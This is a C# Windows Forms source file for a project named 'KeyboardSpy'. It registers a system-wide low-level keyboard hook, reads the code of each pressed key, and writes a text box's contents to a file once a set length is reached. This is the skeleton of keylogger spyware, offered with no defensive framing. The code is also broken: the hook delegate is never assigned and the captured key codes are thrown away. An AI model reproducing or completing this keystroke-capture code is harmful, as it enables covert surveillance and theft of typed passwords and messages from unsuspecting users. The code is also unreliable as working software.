using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using KeyboardSpy.Methods;

namespace KeyboardSpy
{
    public partial class Form1 : Form
    {
        LowLevelKeyboardProc proc;
        static IntPtr hookId = IntPtr.Zero;
        public Form1()
        {
            InitializeComponent();

            hookId = SetHook(proc);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return DllImport.SetWindowsHookEx((IntPtr)Consts.WH_KEYBOARD_LL, proc,
                    DllImport.GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)Consts.WM_KEYDOWN)
            {
                int Code = Marshal.ReadInt32(lParam);
            }

            return DllImport.CallNextHookEx(hookId, nCode, wParam, lParam);
        }

        private void tbText_TextChanged(object sender, EventArgs e)
        {
            int count = 0;
            if(tbText.TextLength == numUpDown.Value)
            {
                FileManager.Write(tbText.Text);
                count++;
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
           
        }
    }
}
